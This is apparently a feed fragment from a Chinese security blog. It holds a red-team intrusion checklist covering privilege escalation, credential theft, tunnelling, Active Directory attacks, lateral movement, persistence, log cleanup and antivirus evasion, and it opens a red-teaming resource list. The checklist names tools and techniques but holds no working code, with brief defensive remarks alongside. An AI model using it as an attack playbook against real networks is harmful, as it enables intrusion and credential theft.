CVE-2019-1322 &amp;amp; CVE-2019-1405			    [重点]
cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]	    [重点]		

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;linux 内核漏洞 本地提权 [linux-exploit-suggester]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CVE-2016-5195					    [重点]
CVE-2017-16995
CVE-2019-13272

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;利用各类第三方服务 / 软件工具提权&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Mssql 						    [重点]
Oracle         					    [重点]
Mysql
各类第三方软件dll劫持 				    [重点]
suid权限                        
计划任务
各种错误服务配置利用

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x06-内网安全-敏感信息搜集防御重点可在此项严格限制各种系统内置命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x06-内网安全-敏感信息搜集防御重点可在此项严格限制各种系统内置命令执行&#34;&gt;#&lt;/a&gt; 0x06 内网安全 [敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;搜集当前已控 &amp;quot;跳板机&amp;quot; 的各类敏感信息&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述

查看当前shell权限 及 详细系统内核版本
获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip
获取当前系统最近的用户登录记录
获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置... ]
获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息
获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]
获取本机 rdp / ssh 端口开启状态 及 其默认端口号
获取本机所有用户的rdp外连记录
获取本机的所有SSH登录记录
获取当前系统所有登录成功的日志 [ 针对windows ]
获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]
获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录
获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]
获取当前用户 桌面 及 回收站 里的所有文件列表
获取当前系统的所有存在suid权限的二进制程序
获取当前系统代理 [ ip &amp;amp; 端口 ]
获取当前系统所有的自启动注册表项值
获取当前系统的所有 ipc 连接 及 已启用共享
获取当前系统的所有挂载[mount]
获取当前系统的防火墙状态
获取当前系统所有分区/盘符及其详细使用情况
获取本机的累计开机时长
获取本机arp / dns缓存
获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby...等语言的执行环境,后期可设法利用 ]
获取当前系统所有本地用户及组列表
获取当前系统host文件内容
获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]
远程截屏捕捉目标用户敏感操作

由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;利用当前已控 &amp;quot;跳板机&amp;quot;, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布&lt;/li&gt;
&lt;li&gt;批量抓取内网所有 windows 机器名 和 所在 &amp;quot;域&amp;quot; / &amp;quot;工作组名&amp;quot; [smb 探测扫描]&lt;/li&gt;
&lt;li&gt;针对内网的各种高危敏感服务定位 [&amp;quot;安全&amp;quot; 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]&lt;/li&gt;
&lt;li&gt;内网批量 Web Banner 抓取，获取关键目标业务系统如下&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;内网各种文件[共享]服务器
内网各类web服务器  [ 可用于后期留入口 ]
内网各类数据库服务器
内网邮件服务器  [ 可用于后期留入口 ]
内网Vpn服务器  [ 可用于后期留入口 ]
内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti...
内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端...
内网日志服务器
内网补丁服务器
内网各类OA,ERP,CRM,SRM,HR系统... 
内网打印服务器
内网 MES 系统 
内网虚拟化服务器 / 超融合平台 [Vmware ESX]
内网堡垒机...
内网运维,研发 部门员工的机器
内网路由,交换设备...
等等等...

针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现
通过在一些关键节点设备/服务器上部署探针搜集流量
再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;针对各类已知系统高危 RCE 漏洞的批量探测识别与利用&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]
MS17-010
CVE-2019-0708

其实针对此类漏洞的攻击利用识别,就显得比较直白了
通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x07-内网安全-各类敏感凭证-搜集-与-窃取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x07-内网安全-各类敏感凭证-搜集-与-窃取&#34;&gt;#&lt;/a&gt; 0x07 内网安全  [各类敏感凭证 &amp;quot;搜集&amp;quot; 与 &amp;quot;窃取&amp;quot;]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;主动密码搜集&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的
此处不再赘述, 此项非防御重点, 因为压根也不好防

批量抓取当前机器上的 &amp;quot;各类基础服务配置文件中保存的各种账号密码&amp;quot;
   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...
想办法 &amp;quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&amp;quot;
   比如, *.ls,*.doc,*.docx, *.txt....
抓取各类 &amp;quot;数据库客户端工具中保存各种数据库连接账号密码
   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]

抓取当前系统 &amp;quot;注册表中保存的各类账号密码hash&amp;quot; [ Windows ]
抓取当前系统所有 &amp;quot;本地用户的明文密码/hash&amp;quot; [ Windows &amp;amp; linux ]
抓取当前系统的所有 &amp;quot;用户token&amp;quot; [ Windows ]
抓取 &amp;quot;windows凭据管理器中保存的各类连接账号密码&amp;quot;
抓取 &amp;quot;MSTSC 客户端中保存的所有rdp连接账号密码&amp;quot;
抓取各类 &amp;quot;VNC客户端工具中保存的连接密码&amp;quot;
抓取 &amp;quot;GPP目录下保存的各类账号密码&amp;quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]
抓取各类 &amp;quot;SSH客户端工具中保存的各种linux系统连接账号密码&amp;quot;, SecureCRT,Xshell,WinSCP,putty
抓取各类 &amp;quot;浏览器中保存的各种web登录密码&amp;quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器
抓取各类 &amp;quot;数据库表中保存的各类账号密码hash&amp;quot;
抓取各类 &amp;quot;FTP客户端工具中保存的各种ftp登录账号密码&amp;quot;, filezila, xftp...
抓取各类 &amp;quot;邮件客户端工具中保存的各种邮箱账号密码&amp;quot;, forxmail, thunderbird...
抓取各类 &amp;quot;SVN客户端工具中保存的所有连接账号密码及项目地址&amp;quot;
抓取各类 &amp;quot;VPN客户端工具中保存的各种vpn链接账号密码&amp;quot;


&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;被动密码搜集 [等着管理员自己来送密码]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]

Windows SSP [持久化/内存]
Hook PasswordChangeNotify [持久化/内存]
OWA 登录账号密码截获
截获mstsc.exe中输入的rdp连接账号密码
linux 别名记录利用
本机明文密码嗅探 [ http,ftp,pop3... ]
传统键盘记录
windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Hash 爆破:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Hashcat [ 完全拼GPU ] 

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x08-内网安全-内网常用-隧道-转发-代理-穿透手法-提炼汇总-防御重点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x08-内网安全-内网常用-隧道-转发-代理-穿透手法-提炼汇总-防御重点&#34;&gt;#&lt;/a&gt; 0x08 内网安全 [内网常用 &amp;quot;隧道&amp;quot;&amp;quot; / &amp;quot;转发&amp;quot;&amp;quot; / &amp;quot;代理&amp;quot;&amp;quot; 穿透手法 提炼汇总 ，防御重点]&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;出网流量刺探
比如,http,dns,以及一些穿透性相对较好的tcp端口... 
这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器

常规 HTTP脚本代理
abptts,Neo-reGeorg,reGeorg,tunna,reduh...
不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行

SSH 隧道
加密端口转发,socks 实战用途非常灵活,此处不细说 ]

Rdp 隧道

反向SOCKS
nps, frp, ssf, CobaltStrike(socks4a &amp;amp; rportfwd ), sscoks ... 
工具基本都不免杀了,需要自行处理

正反向TCP 端口转发
非常多,就不一一列举, eg: nginx,netsh,socat,ew....

DNS加密隧道			

Web端口复用

需要明白的是,在一般的红队场景中
入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x09-域内网安全-域内常用攻击手法-域渗透-提炼汇总防御重点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x09-域内网安全-域内常用攻击手法-域渗透-提炼汇总防御重点&#34;&gt;#&lt;/a&gt; 0x09 域内网安全 [域内常用攻击手法 ( 域渗透)，提炼汇总，防御重点 ]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;针对当前域的一些常规信息搜集 [其实现实中，只需要一个 BloodHound &amp;amp; Pingcastle 足矣，就是工具需要自行事先免杀好]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;获取当前域内的完整域管列表
获取当前域内的所有域控机器名列表
获取当前域内的所有DNS服务器机器名列表
获取当前域内的所有SPN
获取当前域内的所有OU
获取当前域内的所有用户 &amp;amp; 用户组列表
获取当前域信任关系 [ 跨域渗透 ]
获取当前域内所有机器的开机时间
获取当前域内网段及web站点
获取当前域内策略 [ 主要是为了了解密码策略 ]
获取当前域林
.......

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;快速获取目标域控权限的一些常规手法&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ] 
服务票据hash破解(&amp;quot;尤其是域管用户的&amp;quot;) [ kerberoast ]
批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]
Kerberos 委派利用
爆破LDAP
Exchange特定ACL滥用
SSP 截获关键服务器登录密码
利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞... ],在内网循环抓各类密码,直至
  抓到域管密码
  抓到域管令牌
DNSAdmin 组成员滥用 [ 加载执行恶意dll ]
LAPS
MS14-068 [ 如今实际中已很少遇到了 ]
LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;域内后渗透敏感信息搜集分析&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;获取所有DNS记录
导出当前域的完整LDAP数据库
提取当前域的ntds.dit [ 域内账号密码数据库 ]
  Dcsync同步
  Volume Shadow Copy Service

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;域内指定用户登录 ip 定位&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;利用OWA登录日志
利用域控服务器登录日志
指定服务银票 [ Silver Ticket ]
除此之外,就是下面的各类常规横向手法

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;域内指定用户机器定向控制技巧&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;绑定用户登录脚本
利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]
PTT [ 票据传递 ]

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;针对域管的各种权限维持技巧&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;金票
Skeleton Key
DSRM密码同步
OWA后门
...

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;域内 Exchange 邮件数据脱取&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;利用Ews接口通过PTH的方式脱邮件

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x10-内网安全-跨平台横向渗透-远程执行防御重点-重中之重&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x10-内网安全-跨平台横向渗透-远程执行防御重点-重中之重&#34;&gt;#&lt;/a&gt; 0x10 内网安全 [跨平台横向渗透 (远程执行)，防御重点 ( &amp;quot;重中之重&amp;quot; ) ]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;从 Windows 平台 横向至  Windows 平台&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限

远程服务管理 [ SCM ]
远程创建执行计划任务 [ Scheduled Tasks ]
WMI 远程执行 [ WMI ]
针对高版本Windows 的WinRM 远程执行 
DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]
高版本 RDP 远程执行
利用MSSQL数据库存储过程来变相远程执行
利用Oracle数据库存储过程来变相远程执行
SMB [ PTH (hash传递) ]
RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]
利用补丁服务器下发执行
利用EDR主控端定向下发执行

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;从 Windows 平台 横向至 *inux 平台&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;plink 或者 基于Windows SSH库自行开发各种远程执行小工具

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;从 *inux 平台 横向至 Windows 平台&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下
wmiexec_linux_x86_64
smbexec_linux_x86_64
psexec_linux_x86_64
atexec_linux_x86_64
dcomexec_linux_x86_64

另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;从 *inux 平台 横向至 *inux 平台&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;各种远程下载技巧&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;wget [ win &amp;amp; linux ]
curl [ win &amp;amp; linux ]

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道
某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可

CertUtil.exe
Bitsadmin.exe
Regsvr32.exe
Rundll32.exe
Powershell.exe
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x11-内网安全-权限维持防御重点-注-有些细节此处并未展开详细说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x11-内网安全-权限维持防御重点-注-有些细节此处并未展开详细说明&#34;&gt;#&lt;/a&gt; 0x11 内网安全 [权限维持，防御重点] [ 注：有些细节此处并未展开详细说明 ]&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;边界入口权限维持&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;OWA 登录口 [ 账号密码,webshell ]
VPN 登录口 [ 账号密码,shell ]
其他 MAIL 登录口 [ 账号密码 ]
边界 Web服务器 [ Webshell 驻留技巧 ]
边界路由交换设备 [ 账号密码,shell ]
...

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Windows 单机系统维持 [临时]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;系统计划任务 [ 高权限/低权限 ]
常规注册表自启动项 [ 用户权限/system权限 ]
Mssql存储过程 [ 继承服务权限 ]
WMI
Winlogon
CLR
Logon Scripts
MruPidlList
Mof
传统远控
...

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;linux 单机系统维持 [临时]&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Patch SSH
替换各类基础服务so [ PAM,Nginx,Rsync ...] 
系统计划任务
传统应用层远控
驱动层远控( 针对特定内核版本 )

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x12-痕迹处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x12-痕迹处理&#34;&gt;#&lt;/a&gt; 0x12 痕迹处理&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;web日志 [ 访问, 错误日志 ]
数据库日志 [ 异常连接日志,慢查询日志 ]
系统各类安全日志 [ ssh,rdp,smb,wmi,powershell....]
各类邮箱登录日志
域内敏感攻击利用日志 [ 金票,银票... ]
此项为专业蓝队范畴,不再赘述
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x13-各类常用-c2-渗透-框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x13-各类常用-c2-渗透-框架&#34;&gt;#&lt;/a&gt; 0x13 各类常用 C2 / 渗透 框架&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;CobaltStrike [二次开发]
  payload(beacon) 逆向/改进重写
Metasploit [二次开发]
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x14-各类常用-webshell管理工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x14-各类常用-webshell管理工具&#34;&gt;#&lt;/a&gt; 0x14 各类常用 Webshell 管理工具&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;菜刀	caidao20160622
冰蟹	Behinder_v2.0.1
蚁剑	AntSword
......

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0x15-免杀-及-各类防火墙对抗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x15-免杀-及-各类防火墙对抗&#34;&gt;#&lt;/a&gt; 0x15 免杀 及 各类防火墙对抗&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;静态&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;混淆:
手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等....
工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]
...

加壳:
一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]
最好的方式还是尝试自己写壳,就是成本较高
...

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;动态&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;反射
shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )
白利用
......

注:
   理论上, 这些应该也没有什么非常通用的方法
   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;流量:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;域前置[利用大厂cdn]
DNS加密隧道
第三方公共邮箱上线
第三方网盘上线
第三方社交网站上线
第三方匿名社交工具上线[eg: tg机器人,tor...]

&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/Reference/Awesome-Red-Teaming/</guid>
            <title>Awesome Red Teaming【转】</title>
            <link>https://or0kit.github.io/PenetrationTest/Reference/Awesome-Red-Teaming/</link>
            <category>RedTeam</category>
            <pubDate>Mon, 18 Jan 2021 15:02:37 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;awesome-red-teaming&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#awesome-red-teaming&#34;&gt;#&lt;/a&gt; Awesome Red Teaming&lt;/h1&gt;
&lt;p&gt;一个最好的红队资源清单&lt;/p&gt;
&lt;p&gt;此列表同样适用于希望了解红队但没有相关知识储备的人&lt;/p&gt;
&lt;p&gt;无论如何，这是一个活跃的列表，会定期更新最新的对抗策略与技术&lt;/p&gt;
&lt;p&gt;你可以通过发起 PR 来添加更多有用信息！&lt;/p&gt;
&lt;h1 id=&#34;目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录&#34;&gt;#&lt;/a&gt; 目录&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B&#34;&gt;社会工程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#-osint&#34;&gt;OSINT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E6%8A%95%E9%80%92&#34;&gt;投递&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E6%A4%8D%E5%85%A5&#34;&gt;植入&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8&#34;&gt;横向移动&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6&#34;&gt;命令控制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E5%B5%8C%E5%85%A5%E5%BC%8F%E4%B8%8E%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87&#34;&gt;嵌入式与物理设备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E6%9D%82%E9%A1%B9&#34;&gt;杂项&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E7%94%B5%E5%AD%90%E4%B9%A6%E7%B1%8D&#34;&gt;电子书籍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E5%9F%B9%E8%AE%AD&#34;&gt;培训&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E8%AE%A4%E8%AF%81&#34;&gt;认证&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 社会工程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc29jaWFsLWVuZ2luZWVyLm9yZy8=&#34;&gt;社会工程门户网站&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5kYXJrcmVhZGluZy5jb20vdGhlLTctYmVzdC1zb2NpYWwtZW5naW5lZXJpbmctYXR0YWNrcy1ldmVyL2QvZC1pZC8xMzE5NDEx&#34;&gt;7 个最好的社会工程攻击案例&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnNhY29uZmVyZW5jZS5jb20vd3JpdGFibGUvcHJlc2VudGF0aW9ucy9maWxlX3VwbG9hZC9kYXMtMzAxX3dpbGxpYW1zX3JhZGVyLnBkZg==&#34;&gt;在大数据中使用社会工程策略 - RSA Conference Europe 2012&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpYS5kZWZjb24ub3JnL0RFRiUyMENPTiUyMDI0L0RFRiUyMENPTiUyMDI0JTIwcHJlc2VudGF0aW9ucy9ERUZDT04tMjQtU2V5bW91ci1UdWxseS1XZWFwb25pemluZy1EYXRhLVNjaWVuY2UtRm9yLVNvY2lhbC1FbmdpbmVlcmluZy1XUC5wZGY=&#34;&gt;为社会工程武装数据科学：Twitter 中的自动 E2E 鱼叉式网络钓鱼 - Defcon 23&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2ltYWdlcy81LzU0L1ByZXNlbnRhdGlvbl9Tb2NpYWxfRW5naW5lZXJpbmcucGRm&#34;&gt;OWASP 社会工程介绍 - OWASP&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdXNiLWRyb3AtYXR0YWNrcy10aGUtZGFuZ2VyLW9mLWxvc3QtYW5kLWZvdW5kLXRodW1iLWRyaXZlcy8=&#34;&gt;USB 丢失攻击：USB 设备丢失与发现的危险&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JlZHRlYW1zZWN1cml0eS9QeVBoaXNoaW5n&#34;&gt;PyPhishing 工具包&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb3NjaGVkdWxlLmNvbS9ibG9nL2Jlc3QtdGltZS10by1zZW5kLWVtYWlsLw==&#34;&gt;发送电子邮件的最佳时间&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-2&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; OSINT&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ppdm9pL2F3ZXNvbWUtb3NpbnQ=&#34;&gt;最好的 OSINT 列表&lt;/span&gt; - 覆盖了很多 OSINT 资源&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNy9yZWNvbm5haXNzYW5jZS11c2luZy1saW5rZWRpbnQv&#34;&gt;使用 LinkedInt 进行侦察&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-3&#34;&gt;#&lt;/a&gt; &lt;a href=&#34;#table-of-contents&#34;&gt;↑&lt;/a&gt; 投递&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS9oZWxwLXNwZWFyLXBoaXNo&#34;&gt;Cobalt Strike - 鱼叉式网络钓鱼文档&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8xMi8xNy93aGF0cy10aGUtZ28tdG8tcGhpc2hpbmctdGVjaG5pcXVlLW9yLWV4cGxvaXQv&#34;&gt;Cobalt Strike - 什么是钓鱼？如何利用？&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WN1VKalZjcTJBbw==&#34;&gt;使用 Cobalt Strike 进行网络钓鱼 - Raphael Mudge&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDcvMTMvcGhpc2hpbmctYWdhaW5zdC1wcm90ZWN0ZWQtdmlldy8=&#34;&gt;针对受保护的视图进行钓鱼&lt;/span&gt;&lt;/li&gt;
